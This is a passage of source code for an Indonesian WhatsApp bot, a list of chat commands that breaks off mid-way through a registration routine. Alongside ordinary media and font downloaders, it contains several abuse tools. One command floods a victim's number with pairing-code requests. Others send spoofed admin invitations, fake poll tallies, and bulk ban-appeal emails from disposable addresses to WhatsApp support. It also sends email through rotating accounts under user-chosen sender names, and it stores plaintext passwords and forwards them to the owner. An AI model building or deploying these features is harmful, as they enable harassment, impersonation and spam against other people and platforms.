// nih yg minta ig supp download story 
case 'fb3': case 'facebook3': case 'fbdl3':
case 'ig3': case 'instagram3': case 'igdl3': {
 if (!args[0]) return m.reply("🔗 Masukkan URL Facebook atau Instagram!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("Gagal mengambil data.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("Tidak ada media yang dapat diunduh.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media tidak ditemukan.");
 }
 } else {
 throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Sky.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
 } else if (res.type === "image") {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Sky.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Berhasil mengunduh gambar!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await Sky.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("Terjadi kesalahan saat mengambil media.");
 }
}
break

//=======================================================
    
// sengaja gw tambahin fitur listfont,soalnya biar lu tau list nya
case 'font': case 'text': {
  if (!q) return m.reply("Inputnya mana? Kalo niat nyari font mah minimal input nama fontnya anjir 🗿");
  const fontx = /^[a-zA-Z0-9\s-]+$/;
  const fn = q.trim();
  if (!fontx.test(fn)) return m.reply(`Format nama font lu salah bree.. Pake huruf, angka, spasi atau strip aja yak kalo kagak tau mah :v, kalau mau liat list font ketk ${prefix}listfont`);
  try {
    const axios = require('axios');
    const { data } = await axios.get('https://fontasy.co/api/google/webfonts', {
      headers: {
        'accept': 'application/json',
        'user-agent': 'Postify/1.0.0'
      }
    });
    if (!data || !data.items) return m.reply("Udah sih, capek banget... Gagal ngambil data fontnya euy 🗿");
    const hasil = data.items.filter(font => font.family.toLowerCase().includes(fn.toLowerCase()) || font.category.toLowerCase().includes(fn.toLowerCase())
    );
    if (!hasil.length) return m.reply("Waduh fontnya kagak ketemu nih bree.. 🥴");
    let teks = `*Hasil Pencarian Font: ${fn}*\n\n`;
    for (let i = 0; i < hasil.length; i++) {
      const font = hasil[i];
      teks += `*${i + 1}. ${font.family}*\n`;
      teks += `• Kategori: ${font.category}\n`;
      teks += `• Versi: ${font.version}\n`;
      teks += `• Terakhir Update: ${font.lastModified}\n`;
      teks += `• Subset: ${font.subsets.join(', ')}\n`;
      teks += `• Variants: ${font.variants.join(', ')}\n`;
      const fileUrls = Object.values(font.files);
      if (fileUrls.length) {
        teks += `• Download: ${fileUrls[0]}\n\n`;
        const fontBuffer = await axios.get(fileUrls[0], { responseType: 'arraybuffer' });
        await Sky.sendMessage(m.chat, {
          document: Buffer.from(fontBuffer.data),
          fileName: `${font.family}.ttf`,
          mimetype: 'font/ttf'
        }, { quoted: m });
      } else {
        teks += `\n`;
      }
    }
    m.reply(teks);
  } catch (err) {
    console.error(err);
    m.reply("Yah error bree.. Coba lagi dah 🗿");
  }
}
break
 
case 'listfont': case 'listfonts': case 'listtext': {
  try {
    const axios = require('axios');
    const { data } = await axios.get('https://fontasy.co/api/google/webfonts', {
      headers: {
        'accept': 'application/json',
        'user-agent': 'Postify/1.0.0'
      }
    });
    if (!data || !data.items) return m.reply("Gagal ambil list font bree..");
    let teks = `*Daftar Google Fonts Tersedia*\nTotal: ${data.items.length} fonts\n\n`;
    data.items.forEach((font, i) => {
      teks += `*${i + 1}. ${font.family}*\n`;
    });
    teks += `\nMau cari font tertentu? Ketik:\n*font nama-font*\nContoh: *${prefix}font Inria Sans*`;
    if (teks.length > 3000) {
      const { writeFileSync } = require('fs');
      const path = require('path');
      const filePath = path.join(__dirname, 'listfont.txt');
      writeFileSync(filePath, teks);
      await Sky.sendMessage(m.chat, {
        document: { url: filePath },
        fileName: 'List_Font_Google.txt',
        mimetype: 'text/plain'
      }, { quoted: m });
    } else {
      m.reply(teks);
    }
  } catch (err) {
    console.error(err);
    m.reply("Waduh error pas ambil list fontnya..");
  }
}
break
//=======================================================
    
case 'waifuxxx': {
 if (!isCreator) return m.reply("Aplh")
const fetch = require('node-fetch')
async function getNsfwImage() {
  const res = await fetch('https://api.waifu.pics/nsfw/waifu')
  const json = await res.json()
  return { url: json.url }
  try {
    const { url } = await getNsfwImage()
    await Sky.sendMessage(m.chat, {
      image: { url },
      caption: 'NSFW Content'
    }, { quoted: m })
  } catch (err) {
    await Sky.sendMessage(m.chat, { text: 'Gagal mengambil gambar NSFW' }, { quoted: m })
  }
}
}
//=======================================================
    
case 'fakeinvite': {
if (!text) return m.reply("mana id salurannya?")
const fqe = { key:{ remoteJid: 'status@broadcast', participant: global.owner+"@s.whatsapp.net" }, message:{ newsletterAdminInviteMessage: { newsletterJid: `${text}`, newsletterName: 'UNDANGAN ADMIN SALURAN', caption: `© ${namaOwner}`, inviteExpiration: 0}}}
await Sky.sendMessage(m.chat, {text: fqe}, {quoted:m})
}
break

//=======================================================

case 'dafont': {
  let cmd = args[0]?.toLowerCase()

  if (!cmd) return m.reply(`*Gunakan Salah Satu Command Ini:*

1. *.dafont search [nama_font]*  
   Untuk mencari font berdasarkan nama.

2. *.dafont dl [link_download]*  
   Untuk mengunduh font dari link hasil pencarian.

*Contoh:*  
.dafont search fancy  
.dafont dl https://dl.dafont.com/dl/?f=fancy_nancy_2`)

  switch (cmd) {
    case 'search':
      if (!args[1]) return m.reply('Mau cari apa di Dafont?')
      m.reply('Searching fonts...')
      try {
        const html = await axios.get('https://www.dafont.com/search.php?q=' + args.slice(1).join(' '))
        const $ = cheerio.load(html.data)
        const result = []

        $('.lv1left.dfbg').each((i, el) => {
          let elem = $(el).text()
          let name = elem.split('by')[0].trim()
          let creator = elem.split('by')[1]?.trim() || '-'
          let total_down = $(el).next().next().find('.light').text().trim()
          let link = $(el).next().next().next().find('a.dl').attr('href')
          if (link) {
            result.push({
              name,
              creator,
              total_down,
              link: 'https:' + link
            })
          }
        })

        if (result.length === 0) return m.reply(`Font dengan nama "${args.slice(1).join(' ')}" tidak ditemukan!`)
        let teks = `*『 DAFONT SEARCH 』*`
        for (let i = 0; i < result.length; i++) {
          const font = result[i]
          teks += `\n\n*${i + 1}. ${font.name}*\n`
          teks += `┌─────────────────\n`
          teks += `├ *Creator :* ${font.creator}\n`
          teks += `├ *Total Download :* ${font.total_down}\n`
          teks += `├ *Link Download :* ${font.link}\n`
          teks += `└─────────────────\n`
        }
        teks += `\nUntuk mengunduh font, gunakan perintah:\n*.dafont dl [link_download]*`
        m.reply(teks)
      } catch (e) {
        console.error(e)
        m.reply('Error, coba lagi nanti.')
      }
      break

    case 'dl':
      if (!args[1]) return m.reply('Mana link-nya?')
      if (!args[1].startsWith('https://dl.dafont.com/')) return m.reply('Link-nya yang valid donk!')
      try {
        m.reply('Downloading font...')
        let res = await axios.get(args[1], { responseType: 'arraybuffer' })
        let fontName = args[1].split('=').pop()
        let fileName = `${fontName}.zip`
        await Sky.sendMessage(m.chat, {
          document: res.data,
          fileName,
          mimetype: 'application/zip'
        }, { quoted: m })
      } catch (e) {
        console.error(e)
        m.reply('Gagal download font, coba lagi nanti.')
      }
      break

    default:
      m.reply(`*Subcommand yang tersedia:*\n\n.dafont search\n.dafont dl`)
  }
}
break

//=======================================================
/*
*[ Fitur Count Jam ]*
Hitung mundur waktu dari yg telah diketik
Type: Case
*[ Sumber ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v

*Code:*
*/
case 'countjam': {
  if (!q) return m.reply('Contoh: countjam 06:35');
  const moment = require('moment-timezone');
  const [jamTarget, menitTarget] = q.split(':').map(x => parseInt(x));
  if (isNaN(jamTarget) || isNaN(menitTarget))
    return m.reply('Format jam salah. Contoh: 06:35');
  let now = moment().tz('Asia/Jakarta');
  let target = moment().tz('Asia/Jakarta').hour(jamTarget).minute(menitTarget).second(0);
  if (target.isBefore(now)) target.add(1, 'day');
  let diff = target.diff(now, 'seconds');
  if (diff <= 0) return m.reply('Waktu target sudah lewat.');
  function formatTime(sec) {
    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
    const s = String(sec % 60).padStart(2, '0');
    return `${h}:${m}:${s}`;
  }
  const teksAwal = `⏳ *Countdown dimulai!*\nMenuju jam *${q} WIB*`;
  let sent = await Sky.sendMessage(m.chat, { text: `${teksAwal}\n\nSisa waktu: *${formatTime(diff)}*` }, { quoted: m });

  let interval = setInterval(async () => {
    diff--;
    if (diff <= 0) {
      clearInterval(interval);
      return await Sky.sendMessage(m.chat, {
        edit: sent.key,
        text: `✅ *Waktu ${q} WIB telah tiba!*\nSemoga kamu nggak telat ya!`
      });
    }
    await Sky.sendMessage(m.chat, {
      edit: sent.key,
      text: `${teksAwal}\n\nSisa waktu: *${formatTime(diff)}*`
    });
  }, 1000);
}
break

//=======================================================

case 'spampairing': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
m.reply("Proses Spam Bang")
let [peenis, pepekk = "200"] = text.split("|")
let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(2050)
let prc = await Sky.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
m.reply("succes spam pairing code")
}
break

//=======================================================

case "imgsharpen": case "imgs": case "tohd3": {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
    await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
    let media = await Sky.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('postimages.org')
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rafzbot.png')
    let api = `https://fastrestapis.fasturl.cloud/aiimage/imgsharpen?url=${directLink}`
    await Sky.sendMessage(m.chat, { image: { url: api }, caption: "Nih hasil *imgsharpen*-nya..." }, { quoted: m })
    await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    await fs.unlinkSync(media)
}
break

//=======================================================

/*
- [ `Send Polling Group/Channel` ]
- Created: Rizki
- Baileys: baileys-pro(npm i baileys-pro)
- Sumber: https://whatsapp.com/channel/0029VadfVP5ElagswfEltW0L
*/


case "pollch": {
  if(!text) return m.reply(`Contoh: Nama Polling|Option1|Option2|Jumlah Poling1|Jumlah Polling2\n\nKayak Gini: .poll Tes|Tes1|Tes2|10|200`);
  var [ namePoll, Op1, Op2, jumlahPoll1, JumlahPoll2 ] = text.split('|');
  await m.reply('Tunggu Sebentar...');
   Sky.sendMessage(m.chat, {
    pollResult: {
      name: namePoll,
      votes: [[Op1, jumlahPoll1], [Op2, JumlahPoll2]],
    },
  })
}
break

              
              case "pollgc": {
  if(!text) return m.reply('Contoh: Nama Polling|Option1|Option2');
  var [ namePoll, Op1, Op2 ] = text.split('|');
  await m.reply('Tunggu Sebentar...');
  Sky.sendMessage(m.chat, {
    poll: {
      name: namePoll,
      values: [Op1, Op2],
      selectableCount: 1,
      toAnnouncementGroup: true
    }
  })
}
break

//=======================================================

case 'bigjpg':
case 'upscale': {
  const fs = require('fs');
  const axios = require('axios');
  const { ImageUploadService } = require('node-upload-images');
const qmsg = m.quoted ? m.quoted : m;
const mime = (qmsg.msg || qmsg).mimetype || '';
if (!/image/.test(mime)) {
  return m.reply('Reply gambar yang mau di-upscale dulu bree 🗿\n\nNote: tanpa style dan noise gpp, kamu reply aja\n\n.upscale style,noise\nContoh: .upscale photo,2\n\nPilihan Style yang Valid:\nart → untuk gambar seni/ilustrasi\nphoto → untuk foto asli\n\nPilihan Noise Reduction Level:\n-1 → Ninguno (tanpa pengurangan noise)\n0 → Bajo (rendah)\n1 → Medio (sedang)\n2 → Alto (tinggi)\n3 → El más alto (tertinggi)');
}
  let style = (q.split(',')[0] || 'art').toLowerCase().trim();
  let noise = (q.split(',')[1] || '-1').trim();

  let availableStyles = {
    'art': 'Artwork',
    'photo': 'Foto'
  };
  let availableNoise = {
    '-1': 'Ninguno',
    '0': 'Bajo',
    '1': 'Medio',
    '2': 'Alto',
    '3': 'El más alto'
  };

  if (!availableStyles[style]) {
    return m.reply(`Stylenya kagak valid bree.. Pilih: ${Object.keys(availableStyles).join(', ')}`);
  }
  if (!availableNoise[noise]) {
    return m.reply(`Noise levelnya kagak valid bree.. Pilih: ${Object.keys(availableNoise).join(', ')}`);
  }

  let media = await Sky.downloadAndSaveMediaMessage(m.quoted);
  const service = new ImageUploadService('pixhost.to');
  let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'rafzbot.jpg');
  let img = directLink.toString();

  if (!img) {
    await fs.unlinkSync(media);
    return m.reply('Gagal upload ke pixhost.to bree...');
  }

  let fileName = img.split('/').pop().split('#')[0].split('?')[0] || 'image.jpg';
  if (fileName.endsWith('.webp')) {
    fileName = fileName.replace('.webp', '.jpg');
  }

  let res = await axios.get(img, { responseType: 'arraybuffer' });
  let fileSize = parseInt(res.headers['content-length'] || res.data.length);
  let width = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;
  let height = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;

  if (fileSize > 5 * 1024 * 1024) {
    await fs.unlinkSync(media);
    return m.reply("Size imagenya kegedean bree.. Max 5MB yaa");
  }

  await m.reply('Sabar yak... lagi proses upscaling...');

  const config = {
    x2: '2',
    style: style,
    noise: noise,
    file_name: fileName,
    files_size: fileSize,
    file_height: height,
    file_width: width,
    input: img
  };

  try {
    const headers = {
      'origin': 'https://bigjpg.com',
      'referer': 'https://bigjpg.com/',
      'user-agent': 'Postify/1.0.0',
      'x-requested-with': 'XMLHttpRequest'
    };
    const params = new URLSearchParams();
    params.append('conf', JSON.stringify(config));
    const taskx = await axios.post('https://bigjpg.com/task', params, { headers });
    if (taskx.data.status !== 'ok') {
      await fs.unlinkSync(media);
      return m.reply('Gagal bikin task upscaling bree...');
    }
    const taskId = taskx.data.info;
    let attempts = 0;
    const maxAttempts = 20;
    while (attempts < maxAttempts) {
      const check = await axios.get(`https://bigjpg.com/free?fids=${JSON.stringify([taskId])}`, { headers });
      const result = check.data[taskId];

      if (result[0] === 'success') {
        await fs.unlinkSync(media);
        let teks = `*Upscale Berhasil Bree!*\n\n`;
        teks += `• Nama File: ${fileName}\n`;
        teks += `• Size: ${(fileSize / 1024).toFixed(2)} KB\n`;
        teks += `• Resolusi: ~${width}x${height}\n`;
        teks += `• Style: ${availableStyles[style]}\n`;
        teks += `• Noise Reduction: ${availableNoise[noise]}\n\n`;
        teks += `*Link Hasil:* ${result[1]}`;
        return Sky.sendMessage(m.chat, {
          image: { url: result[1] },
          caption: teks
        }, { quoted: m });
      }
      if (result[0] === 'error') {
        await fs.unlinkSync(media);
        return m.reply('Upscalenya gagal bree.. Coba lagi nanti yak!');
      }
      await new Promise(resolve => setTimeout(resolve, 15000)); 
      attempts++;
    }
    await fs.unlinkSync(media);
    return m.reply('Timeout bree... Proses kelamaan wkwk');
  } catch (err) {
    await fs.unlinkSync(media);
    return m.reply('Error saat proses upscaling: ' + err.message);
  }
}
break


//=======================================================

// supp tag/628xx
case 'getpp': {
if (!text) return m.reply('Format salah! Gunakan .getpp @tag atau .getpp 628xx');
  let user;
  if (m.quoted) {
    user = m.quoted.sender;
  } else if (text) {
    const mentioned = text.match(/@(\d{5,})/);
    if (mentioned) {
      user = mentioned[1] + '@s.whatsapp.net';
    } else if (text.includes('62')) {
      const number = text.replace(/[^0-9]/g, '');
      user = number + '@s.whatsapp.net';
    } else {
      return m.reply('Format salah! Gunakan .getpp @tag atau .getpp 628xx');
    }
  } else {
    user = m.quoted ? m.quoted.sender : m.sender;
  }
  try {
    let pp = await Sky.profilePictureUrl(user, 'image');
    await Sky.sendMessage(m.chat, {
      image: { url: pp },
      caption: `Foto profil dari *@${user.split('@')[0]}*`,
      mentions: [user]
    });
  } catch (e) {
    m.reply('Gagal mengambil foto profil! Mungkin tidak ada atau disembunyikan.');
  }
}
break

//=======================================================
  
case "sendemail": {
  try {
    if (!text) {
      return m.reply(
        `📧 *Cara Penggunaan:*\n` +
        `\`${prefix + command} <email tujuan>|<nama anda>|<subjek>|<pesan>\`\n\n` +
        `📌 *Contoh:*\n` +
        `\`${prefix + command} rafz@gmail.com|Rafz|Pesan Penting!!|Halo bro, cek email ini ya~\``
      );
    }

    await Sky.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

    const nodemailer = require("nodemailer");
    const dotenv = require("dotenv");
    dotenv.config();

    const [email_tujuan, nama_anda, subjek, teks] = text.split("|").map(t => t.trim());
    if (!email_tujuan || !nama_anda || !subjek || !teks) {
      return m.reply("⚠️ *Format salah!* Gunakan tanda `|` untuk memisahkan setiap bagian!");
    }

    async function loadPairsFromEnv(prefix = "EMAIL_") {
      const pairs = [];
      for (let i = 1; i <= 200; i++) {
        const val = process.env[`${prefix}${i}`];
        if (!val) continue;
        const [email, pass] = val.split("|").map(x => x.trim());
        if (email && pass) pairs.push({ email, pass });
      }
      return pairs;
    }

    async function loadPairsFromEMAIL_PAIRS() {
      const raw = process.env.EMAIL_PAIRS;
      if (!raw) return [];
      return raw
        .split("|")
        .map(s => s.trim())
        .filter(Boolean)
        .map(item => {
          const [email, pass] = item.split(";").map(x => x.trim());
          return { email, pass };
        });
    }

    async function loadAllPairs() {
      const a = await loadPairsFromEnv("email");
      if (a.length) return a;
      const b = await loadPairsFromEnv("EMAIL_");
      if (b.length) return b;
      const c = await loadPairsFromEMAIL_PAIRS();
      if (c.length) return c;
      return [];
    }

    const pairs = await loadAllPairs();
    if (!pairs.length) {
      return m.reply("🚫 *Tidak ada konfigurasi email ditemukan!* Pastikan variabel `.env` terisi dengan benar!");
    }

    const randomSender = pairs[Math.floor(Math.random() * pairs.length)];
    const SENDER_EMAIL = randomSender.email;
    const APP_PASSWORD = randomSender.pass;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: SENDER_EMAIL,
        pass: APP_PASSWORD
      }
    });

    const mailOptions = {
      from: `"${nama_anda} | Rafzbotz Mailer" <${SENDER_EMAIL}>`,
      to: email_tujuan,
      subject: subjek,
      text: `${teks}\n\n\n‼️ Jangan balas email ini, karena pesan ini dikirim dari bot.`
    };

    transporter.sendMail(mailOptions, async (error, info) => {
      if (error) {
        console.error("Error:", error);
        await Sky.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        return m.reply(`❌ *Gagal mengirim email!*\n\n> _${error.message}_`);
      } else {
        await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        return m.reply(
          `✅ *Email Berhasil Dikirim!*\n\n` +
          `📬 *Penerima:* \`${email_tujuan}\`\n` +
          `👤 *Dari:* \`${nama_anda}\`\n` +
          `📝 *Subjek:* \`${subjek}\`\n` +
          `💬 *Pesan:* \`\`\`${teks}\`\`\``
        );
      }
    });
  } catch (err) {
    console.error(err);
    await Sky.sendMessage(m.chat, { react: { text: "⚠️", key: m.key } });
    return m.reply(
      `⚠️ *Terjadi Kesalahan Internal!*\n\n` +
      `Silakan coba lagi nanti atau hubungi admin.\n\n` +
      `> _${err.message}_`
    );
  }
}
break;
    
//=======================================================
case 'unkenon' : {
if (!text) return m.reply (`${prefix+command} +628xxxxx`)
let cmd = args[0]?.toLowerCase()
let teks = `Mau buka kenon apa? `
const interactiveButtons = [
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Permanen",
             id: `.unkenon-permanen ${text}` 
        })
     },
   {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Spam",
             id: `.unkenon-spam ${text}` 
        })
     }
]
const interactiveMessage = {
    text: "",
    title: teks,
    footer: `${botname2} POWERED BY ©${namaOwner}`,
    interactiveButtons
}
await Sky.sendMessage(m.chat, interactiveMessage, {quoted: m})
}
break
//case send ke email WhatsApp
case 'unkenon-permanen' :{

class TempMail {
 constructor() {
 this.cookie = null;
 this.baseUrl = 'https://tempmail.so';
 }

 async updateCookie(response) {
 if (response.headers['set-cookie']) {
 this.cookie = response.headers['set-cookie'].join('; ');
 }
 }

 async makeRequest(url) {
const axios = require('axios');
 const response = await axios({
 method: 'GET',
 url: url,
 headers: {
 'accept': 'application/json',
 'cookie': this.cookie || '',
 'referer': this.baseUrl + '/',
 'x-inbox-lifespan': '600',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 'sec-ch-ua-mobile': '?1'
 }
 });

 await this.updateCookie(response);
 return response;
 }

 async initialize() {
const axios = require('axios');
 const response = await axios.get(this.baseUrl, {
 headers: {
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
 }
 });
 await this.updateCookie(response);
 return this;
 }

 async getInbox() {
 const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }

 async getMessage(messageId) {
 const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }
 }

 
 const mail = new TempMail();
 await mail.initialize();

 const inbox = await mail.getInbox();

 if (!inbox.data?.name) {
 throw new Error('Failed to get temporary email');
 }

try {
const tekskenonmanen = `Akun WhatsApp saya diblokir secara permanen karena spam, Walaupun saya telah mematuhi ketentuan layanan di WhatsApp, Mohon tinjau kembali akun saya dan segera selesaikan masalah ini, Terima kasih
Nomor saya: ${text}` // teks unkenon permanen
await fetch (`https://fastrestapis.fasturl.cloud/tool/sendmail?to=support@support.whatsapp.com&from=${inbox.data.name}&subject=WhatsApp&message=${encodeURIComponent(tekskenonmanen)}`)

m.reply (`Permintaan banding Whatsapp berhasil di kirim melalui Email!✅
Pesan yg di kirim ke email WhatsApp: ${tekskenonmanen}
Email yang di gunakan: ${inbox.data.name}`)
} catch (e) {
    m.reply('Gagal mengirim permintaan banding.❌');
  }
}
break

case 'unkenon-spam' :{

class TempMail {
 constructor() {
 this.cookie = null;
 this.baseUrl = 'https://tempmail.so';
 }

 async updateCookie(response) {
 if (response.headers['set-cookie']) {
 this.cookie = response.headers['set-cookie'].join('; ');
 }
 }

 async makeRequest(url) {
const axios = require('axios');
 const response = await axios({
 method: 'GET',
 url: url,
 headers: {
 'accept': 'application/json',
 'cookie': this.cookie || '',
 'referer': this.baseUrl + '/',
 'x-inbox-lifespan': '600',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 'sec-ch-ua-mobile': '?1'
 }
 });

 await this.updateCookie(response);
 return response;
 }

 async initialize() {
const axios = require('axios');
 const response = await axios.get(this.baseUrl, {
 headers: {
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
 }
 });
 await this.updateCookie(response);
 return this;
 }

 async getInbox() {
 const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }

 async getMessage(messageId) {
 const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }
 }

 
 const mail = new TempMail();
 await mail.initialize();

 const inbox = await mail.getInbox();

 if (!inbox.data?.name) {
 throw new Error('Failed to get temporary email');
 }

try {
const tekskenonspam = `Akun WhatsApp saya secara tiba tiba diblokir karena spam, Walaupun saya dalam mematuhi ketentuan layanan di WhatsApp Mohon tinjau akun saya dan segera selesaikan masalah ini, TRIMAKASIH; ${text}` // teks unkenon spam
await fetch (`https://fastrestapis.fasturl.cloud/tool/sendmail?to=support@support.whatsapp.com&from=${inbox.data.name}&subject=WhatsApp&message=${encodeURIComponent(tekskenonspam)}`)

m.reply (`Permintaan banding Whatsapp berhasil di kirim melalui Email!✅
Pesan yg di kirim ke email WhatsApp: ${tekskenonspam}
Email yang di gunakan: ${inbox.data.name}`)
} catch (e) {
    m.reply('Gagal mengirim permintaan banding.❌');
  }
}
break


//=======================================================
    
case 'register':{
if (m.isGroup) return Reply(mess.private)
let teks = `Pilih metode daftar di bawah ini `
const interactiveButtons = [
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Nomor Telepon",
             id: `.regno` 
        })
     },
   {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Email (belum tersedia)",
             id: `.regemall` 
        })
     }
]
const interactiveMessage = {
    text: "",
    title: teks,
    footer: `${botname2} POWERED BY ©${namaOwner}`,
    interactiveButtons
}
await Sky.sendMessage(m.chat, interactiveMessage, {quoted: m})
}
break

//====
    case 'regno': {
    if (m.isGroup) return Reply(mess.private);
    if (!text) return Reply(`Cara Mendaftar: ${prefix + command} <nomor>|<nama>|<umur>|<password>\n Contoh:\n.regno 62xxxxx|Rafz|16|rahasia123\n*⚠️Pastikan nomor bisa menerima otp via wa karena ini menggunakan verfikasi via otp*`);
    if (!text.includes("|") || text.split("|").length !== 4) return Reply(`Format Salah!\n Format yg benar: ${prefix + command} <nomor>|<nama>|<umur>|<password>\n Contoh:\n.regno 62xxxxx|Rafz|16|rahasia123`);

    let splitText = text.split("|").map(t => t.trim());
    const nomor1 = splitText[0];
    const nama = splitText[1];
    const umur = splitText[2];
    const password = splitText[3];
    const loginVia = 'no telepon';
    const nomor = nomor1.replace(/[^0-9]/g, "");

    const sudahTerdaftar = await cekPendaftarSudahAda(nomor);
    if (sudahTerdaftar) {
        return Reply(`Nomor telepon ${nomor} sudah terdaftar sebelumnya. Silakan login.`);
    }
if (isCreator) {
        // Owner bot bisa langsung mendaftar tanpa OTP
        const dataBaru = { nama, no: nomor, umur, password, 'login via': loginVia };
        const berhasilSimpan = await simpanDataPendaftarDenganOTP(dataBaru); // Gunakan fungsi yang sama untuk menyimpan

        if (berhasilSimpan) {
            Reply(`Pendaftaran berhasil untuk nomor ${nomor} (Owner Bypass OTP)\nNomor: ${nomor}\nNama: ${nama}\nUmur: ${umur}\nPassword: ${password}\n\nSilakan login menggunakan perintah .login ${nomor} ${password}`);
            try {
                await Sky.sendMessage(ownerNumber, {
                    text: `Pendaftaran Baru (Owner Bypass OTP):\nNomor: ${nomor}\nNama: ${nama}\nPassword: ${password}`,
                    contextInfo: { isForwarded: true }
                }, { quoted: m });
            } catch (error) {
                console.error("Gagal mengirim notifikasi pendaftaran ke grup:", error);
            }
        } else {
            Reply("Terjadi kesalahan saat menyimpan data pendaftaran.");
        }
    } else {
        // Pengguna biasa tetap melalui proses OTP dengan tombol kirim
        const otpLength = 6;
        const otpCode = generateOTP(otpLength);
        const dataBaru = { nama, no: nomor, umur, password, otp: otpCode, 'login via': loginVia };
        const berhasilSimpanSementara = await simpanDataPendaftarDenganOTP(dataBaru);

        if (berhasilSimpanSementara) {
            try {
                const otptext =  `Kode OTP anda: ${otpCode}\nJangan pernah membagikan kepada siapapun! Bahkan jika ini bukan anda, anda jangan mengklik kirim otp`
                const interactiveButtons = [
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Kirim OTP",
             id: `${prefix}verifotp ${otpCode}`
        })
     }
]
const interactiveMessage = {
    text: otptext,
    title: "",
    footer: `${botname2} POWERED BY ©${namaOwner}`,
    interactiveButtons
}
await Sky.sendMessage(nomor + "@s.whatsapp.net", interactiveMessage, {quoted: m});
                Reply(`Kode OTP telah dikirimkan ke nomor ${nomor}.\n\nSilakan tekan tombol 'Kirim OTP' untuk verifikasi.\n\nSilakan kirim kode ini kembali menggunakan perintah ${prefix}verifotp <kode_otp> untuk verifikasi.\n\nJika bukan anda, mohon abaikan saja pesan ini.`);
            } catch (error) {
                console.error("Gagal mengirim OTP dengan tombol:", error);
                Reply("Gagal mengirim OTP, coba lagi nanti.");
